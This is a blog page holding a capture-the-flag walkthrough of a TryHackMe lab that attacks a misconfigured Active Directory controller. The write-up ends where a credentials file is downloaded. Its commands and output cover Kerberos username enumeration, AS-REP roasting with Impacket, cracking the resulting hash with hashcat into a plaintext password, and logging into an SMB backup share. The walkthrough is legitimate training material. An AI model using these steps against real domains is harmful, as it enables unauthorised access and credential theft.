<!DOCTYPE html><html lang="en" > <!-- The Head v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><title>TryHackMe - Attackive directory | amirr0r</title><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="TryHackMe - Attackive directory" /><meta name="author" content="amirr0r" /><meta property="og:locale" content="en_US" /><meta name="description" content="This room from TryHackMe cover attacks against a basic misconfigured Domain Controller via Kerberos enumeration, AS-REP Roasting, Impacket and Evil-WinRM." /><meta property="og:description" content="This room from TryHackMe cover attacks against a basic misconfigured Domain Controller via Kerberos enumeration, AS-REP Roasting, Impacket and Evil-WinRM." /><link rel="canonical" href="https://amirr0r.github.io/posts/thm-attackive-directory/" /><meta property="og:url" content="https://amirr0r.github.io/posts/thm-attackive-directory/" /><meta property="og:site_name" content="amirr0r" /><meta property="og:image" content="https://amirr0r.github.io/assets/img/thm/windows/attackive-directory/attacktive-directory.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-05-19T08:40:04+02:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://amirr0r.github.io/assets/img/thm/windows/attackive-directory/attacktive-directory.png" /><meta property="twitter:title" content="TryHackMe - Attackive directory" /><meta name="twitter:site" content="@amirr0r_" /><meta name="twitter:creator" content="@amirr0r" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"description":"This room from TryHackMe cover attacks against a basic misconfigured Domain Controller via Kerberos enumeration, AS-REP Roasting, Impacket and Evil-WinRM.","headline":"TryHackMe - Attackive directory","dateModified":"2021-05-19T08:40:04+02:00","datePublished":"2021-05-19T08:40:04+02:00","@type":"BlogPosting","image":"https://amirr0r.github.io/assets/img/thm/windows/attackive-directory/attacktive-directory.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://amirr0r.github.io/posts/thm-attackive-directory/"},"url":"https://amirr0r.github.io/posts/thm-attackive-directory/","author":{"@type":"Person","name":"amirr0r"},"@context":"https://schema.org"}</script> <!-- The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps Generated by: https://www.favicon-generator.org/ v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT license --><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"> <!-- CSS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT Licensed --><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"> <script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" async></script> <!-- JS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT Licensed --> <script src="/assets/js/post.min.js" async></script> <script src="/app.js" defer></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"> <!-- The Side Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/sample/avatar.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">amirr0r</a></div><div class="site-subtitle font-italic"></div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></li></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <span id="mode-toggle-wrapper"> <!-- Switch the mode between dark and light. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <i class="mode-toggle fas fa-sun" dark-mode-invisible></i> <i class="mode-toggle fas fa-moon" light-mode-invisible></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.mode != null) { if (this.mode == ModeToggle.DARK_MODE) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.mode != null) { if (self.mode == ModeToggle.DARK_MODE) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightkMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightkMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span> <span class="icon-border"></span> <a href="https://github.com/amirr0r" target="_blank"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/amirr0r_" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href="https://www.linkedin.com/in/amir-barnat/?locale=en_US" target="_blank"> <i class="fab fa-linkedin-in"></i> </a> <a href="/feed.xml" > <i class="fas fa-rss"></i> </a></div></div><!-- The Top Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"> <!-- Refactor the HTML structure. --> <!-- Suroundding the markdown table with '<div class="table-wrapper">. and '</div>' --> <!-- Fixed kramdown code highlight rendering: https://github.com/penibelst/jekyll-compress-html/issues/101 https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901 --><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>TryHackMe - Attackive directory</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Wed, May 19, 2021, 8:40 AM +0200" > May 19, 2021 <i class="unloaded">2021-05-19T08:40:04+02:00</i> </span> by <span class="author"> amirr0r </span></div><div> Updated <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Wed, Jun 30, 2021, 6:15 PM +0200" > Jun 30, 2021 <i class="unloaded">2021-06-30T18:15:30+02:00</i> </span></div></div><div class="post-content"> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="https://amirr0r.github.io/assets/img/thm/windows/attackive-directory/attacktive-directory.png" class="post-preview-img"><p>This <a href="https://tryhackme.com/room/attacktivedirectory">room</a> from TryHackMe cover attacks against a basic misconfigured <strong>Domain Controller</strong> via <strong>Kerberos enumeration</strong>, <strong>AS-REP Roasting</strong>, <strong>Impacket</strong> and <code class="language-plaintext highlighter-rouge">Evil-WinRM</code>.</p><h2 id="setup">Setup</h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="c"># Impacket</span>
git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket
pip3 <span class="nb">install</span> <span class="nt">-r</span> /opt/impacket/requirements.txt
<span class="nb">cd</span> /opt/impacket/ 
pip3 <span class="nb">install</span> <span class="nb">.</span>
python3 setup.py <span class="nb">install</span>
</pre></table></code></div></div><hr /><h2 id="enumeration">Enumeration</h2><h3 id="nmap-scan">Nmap scan</h3><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nmap <span class="nt">-min-rate</span> 5000 <span class="nt">--max-retries</span> 1 <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p-</span> <span class="nt">-oN</span> attackive-directory-full-port-scan.txt 10.10.193.110
Warning: 10.10.193.110 giving up on port because retransmission cap hit <span class="o">(</span>1<span class="o">)</span><span class="nb">.</span>
Nmap scan report <span class="k">for </span>10.10.193.110
Host is up <span class="o">(</span>0.037s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 64568 closed ports, 940 filtered ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2021-05-19 02:26:20Z<span class="o">)</span>
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: spookysec.local0., Site: Default-First-Site-Name<span class="o">)</span>
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: spookysec.local0., Site: Default-First-Site-Name<span class="o">)</span>
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2021-05-19T02:28:37+00:00
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>AttacktiveDirectory.spookysec.local
| Not valid before: 2021-05-18T02:20:39
|_Not valid after:  2021-11-17T02:20:39
|_ssl-date: 2021-05-19T02:28:51+00:00<span class="p">;</span> +1s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49683/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
49812/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: ATTACKTIVEDIREC<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   <span class="nb">date</span>: 2021-05-19T02:28:37
|_  start_date: N/A
</pre></table></code></div></div><hr /><h3 id="welcome-to-attacktive-directory">Welcome to Attacktive Directory</h3><h4 id="what-tool-will-allow-us-to-enumerate-port-139445">What tool will allow us to enumerate port 139/445?</h4><p><code class="language-plaintext highlighter-rouge">enum4linux</code></p><h4 id="what-is-the-netbios-domain-name-of-the-machine">What is the NetBIOS-Domain Name of the machine?</h4><p>Via <code class="language-plaintext highlighter-rouge">enum4linux</code>:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="https://amirr0r.github.io/assets/img/thm/windows/attackive-directory/NetBIOS-Domain_Name.png" alt="NetBIOS Domain Name" /></p><h4 id="what-invalid-tld-do-people-commonly-use-for-their-active-directory-domain">What invalid TLD do people commonly use for their Active Directory Domain?</h4><p><code class="language-plaintext highlighter-rouge">.local</code></p><hr /><h3 id="enumerating-users-via-kerberos">Enumerating Users via Kerberos</h3><p>Wordlists provided:</p><ul><li><a href="https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt">userlist.txt</a></li><li><a href="https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt">passwordlist.txt</a></li></ul><h4 id="what-command-within-kerbrute-will-allow-us-to-enumerate-valid-usernames">What command within Kerbrute will allow us to enumerate valid usernames?</h4><p><code class="language-plaintext highlighter-rouge">userenum</code></p><h4 id="what-notable-account-is-discovered-these-should-jump-out-at-you">What notable account is discovered? (These should jump out at you)</h4><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="https://amirr0r.github.io/assets/img/thm/windows/attackive-directory/ldapsearch.png" alt="ldapsearch" /></p><blockquote><p>Do not forget to add <code class="language-plaintext highlighter-rouge">IP spookysec.local</code> into <code class="language-plaintext highlighter-rouge">/etc/hosts</code></p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre><td class="rouge-code"><pre><span class="nv">$ </span>./kerbrute_linux_amd64 userenum <span class="nt">--dc</span> spookysec.local <span class="nt">-d</span> THM-AD userlist.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ <span class="se">\/</span> ___/ __ <span class="se">\/</span> ___/ / / / __/ _ <span class="se">\</span>
 / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|<span class="se">\_</span>__/_/  /_.___/_/   <span class="se">\_</span>_,_/<span class="se">\_</span>_/<span class="se">\_</span>__/                                        

Version: v1.0.3 <span class="o">(</span>9dad6e1<span class="o">)</span> - 05/19/21 - Ronnie Flathers @ropnop

2021/05/19 04:49:28 <span class="o">&gt;</span>  Using KDC<span class="o">(</span>s<span class="o">)</span>:
2021/05/19 04:49:28 <span class="o">&gt;</span>   spookysec.local:88

2021/05/19 04:49:29 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:       james@THM-AD
2021/05/19 04:49:29 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:       svc-admin@THM-AD
2021/05/19 04:49:30 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:       James@THM-AD
2021/05/19 04:49:30 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:       robin@THM-AD
2021/05/19 04:49:34 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:       darkstar@THM-AD
2021/05/19 04:49:36 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:       administrator@THM-AD
2021/05/19 04:49:40 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:       backup@THM-AD
2021/05/19 04:49:42 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:       paradox@THM-AD
2021/05/19 04:49:54 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:       JAMES@THM-AD
2021/05/19 04:49:58 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:       Robin@THM-AD
2021/05/19 04:50:23 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:       Administrator@THM-AD
2021/05/19 04:51:19 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:       Darkstar@THM-AD
2021/05/19 04:51:34 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:       Paradox@THM-AD
2021/05/19 04:52:27 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:       DARKSTAR@THM-AD
2021/05/19 04:52:44 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:       ori@THM-AD
2021/05/19 04:53:14 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:       ROBIN@THM-AD
2021/05/19 04:54:25 <span class="o">&gt;</span>  Done! Tested 73317 usernames <span class="o">(</span>16 valid<span class="o">)</span> <span class="k">in </span>296.440 seconds
</pre></table></code></div></div><p>The answer is <code class="language-plaintext highlighter-rouge">svc-admin</code></p><h4 id="what-is-the-other-notable-account-is-discovered-these-should-jump-out-at-you">What is the other notable account is discovered? (These should jump out at you)</h4><p><code class="language-plaintext highlighter-rouge">backup</code></p><hr /><h2 id="exploitation-abusing-kerberos">Exploitation (Abusing Kerberos)</h2><blockquote><p>I highly recommand to watch this <a href="https://www.youtube.com/playlist?list=PL3B8L-z5QU-Z0bWmjwgUSLGTzm1k_kVZo">VbScrub - Kerberos</a> YouTube playlist before continuing.</p></blockquote><blockquote><p>And for french readers, this article from hackndo’s blog: <a href="https://beta.hackndo.com/kerberos-asrep-roasting/">AS-REP Roasting</a></p></blockquote><p><strong>AS-REP Roasting</strong> occurs when a user account has the privilege <em>“Does not require Pre-Authentication”</em> set.</p><blockquote><p>This means that the account does not need to provide valid identification before requesting a Kerberos Ticket on the specified user account.</p></blockquote><p>To take advantage of this, we’ll use <code class="language-plaintext highlighter-rouge">GetNPUsers.py</code> (from <strong>Impacket</strong>) that will allow us to query AS-REP Roastable accounts from the Key Distribution Center.</p><blockquote><p><strong>Note</strong>:The only thing that’s necessary to query accounts is a valid set of usernames which we enumerated previously via Kerbrute.</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="nv">$ </span>locate GetNPUsers.py
/usr/local/bin/GetNPUsers.py
/usr/local/bin/GetNPUsers.pyc
/usr/share/doc/python3-impacket/examples/GetNPUsers.py
<span class="nv">$ </span>python3 /usr/local/bin/GetNPUsers.py spookysec.local/svc-admin <span class="nt">-request</span> <span class="nt">-dc-ip</span> <span class="nv">$TARGET</span> <span class="nt">-no-pass</span>
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Getting TGT <span class="k">for </span>svc-admin
<span class="nv">$krb5asrep$23$svc</span><span class="nt">-admin</span>@SPOOKYSEC.LOCAL:b4c31112ac39aae6cc44a1ee38b898d8<span class="nv">$cbdf8ee2166813e2ba6fe8e385f1469d3dbeed4a676a9068c528ab383cf9ae32bffe15ef9b35758c7a2a00c800752004aba07284913712bb68eb4e8f78f41a050bc87f8e3d8599817efcac36b410e56b5927564929f7e5c61b1179db7dd4e6a97e8de381244e145bc0562d31b261f9bbf945f41b89c9a9b0875e35bc35456518acac08a79e03948fd9906eb72f3fbe2a88399f4c1a54f7f2448d79e20979048ff3c4053527c582677c7403a02615a92d8e204c756645849112f8de087e1791909dcf5945a93fffadc60fe94a54f834d4794dd5fce7d36fceb2ac2d591a222b360b0ddcd085aaa7f753f5e868ffa01f3cc4a8</span>
<span class="nv">$ </span>python3 /usr/local/bin/GetNPUsers.py spookysec.local/backup <span class="nt">-request</span> <span class="nt">-dc-ip</span> <span class="nv">$TARGET</span> <span class="nt">-no-pass</span>
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Getting TGT <span class="k">for </span>backup
<span class="o">[</span>-] User backup doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
</span></pre></table></code></div></div><h3 id="we-have-two-user-accounts-that-we-could-potentially-query-a-ticket-from-which-user-account-can-you-query-a-ticket-from-with-no-password">We have two user accounts that we could potentially query a ticket from. Which user account can you query a ticket from with no password?</h3><p><code class="language-plaintext highlighter-rouge">svc-admin</code> ↑</p><h3 id="looking-at-the-hashcat-examples-wiki-page-what-type-of-kerberos-hash-did-we-retrieve-from-the-kdc-specify-the-full-name">Looking at the Hashcat Examples Wiki page, what type of Kerberos hash did we retrieve from the KDC? (Specify the full name)</h3><p><code class="language-plaintext highlighter-rouge">Kerberos 5 AS-REP etype 23</code> ↓</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="https://amirr0r.github.io/assets/img/thm/windows/attackive-directory/krb5asrep.png" alt="krb5asrep" /></p><h3 id="what-mode-is-the-hash">What mode is the hash?</h3><p><code class="language-plaintext highlighter-rouge">18200</code> ↑</p><h3 id="now-crack-the-hash-with-the-modified-password-list-provided-what-is-the-user-accounts-password">Now crack the hash with the modified password list provided, what is the user accounts password?</h3><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nv">$ </span>hashcat <span class="nt">-m</span> 18200 <span class="nt">-a</span> 0 hash.txt /usr/share/wordlists/rockyou.txt
...
<span class="nv">$krb5asrep$23$svc</span><span class="nt">-admin</span>@SPOOKYSEC.LOCAL:b4c31112ac39aae6cc44a1ee38b898d8<span class="nv">$cbdf8ee2166813e2ba6fe8e385f1469d3dbeed4a676a9068c528ab383cf9ae32bffe15ef9b35758c7a2a00c800752004aba07284913712bb68eb4e8f78f41a050bc87f8e3d8599817efcac36b410e56b5927564929f7e5c61b1179db7dd4e6a97e8de381244e145bc0562d31b261f9bbf945f41b89c9a9b0875e35bc35456518acac08a79e03948fd9906eb72f3fbe2a88399f4c1a54f7f2448d79e20979048ff3c4053527c582677c7403a02615a92d8e204c756645849112f8de087e1791909dcf5945a93fffadc60fe94a54f834d4794dd5fce7d36fceb2ac2d591a222b360b0ddcd085aaa7f753f5e868ffa01f3cc4a8</span>:management2005
..
</pre></table></code></div></div><hr /><h2 id="enumration-back-to-the-basics">Enumration (Back to the Basics)</h2><h3 id="using-utility-can-we-map-remote-smb-shares">Using utility can we map remote SMB shares?</h3><p><code class="language-plaintext highlighter-rouge">smbclient</code></p><h3 id="which-option-will-list-shares">Which option will list shares?</h3><p><code class="language-plaintext highlighter-rouge">-L</code></p><h3 id="how-many-remote-shares-is-the-server-listing">How many remote shares is the server listing?</h3><p>There are <strong>6</strong></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="https://amirr0r.github.io/assets/img/thm/windows/attackive-directory/smbclient.png" alt="smbclient" /></p><h3 id="there-is-one-particular-share-that-we-have-access-to-that-contains-a-text-file-which-share-is-it">There is one particular share that we have access to that contains a text file. Which share is it?</h3><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>$ smbclient //10.10.193.110/backup -U 'svc-admin%management2005'
Try "help" to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Sat Apr  4 21:08:39 2020
  ..                                  D        0  Sat Apr  4 21:08:39 2020
  backup_credentials.txt              A       48  Sat Apr  4 21:08:53 2020

                8247551 blocks of size 4096. 3930770 blocks available
smb: \&gt; get backup_credentials.txt 
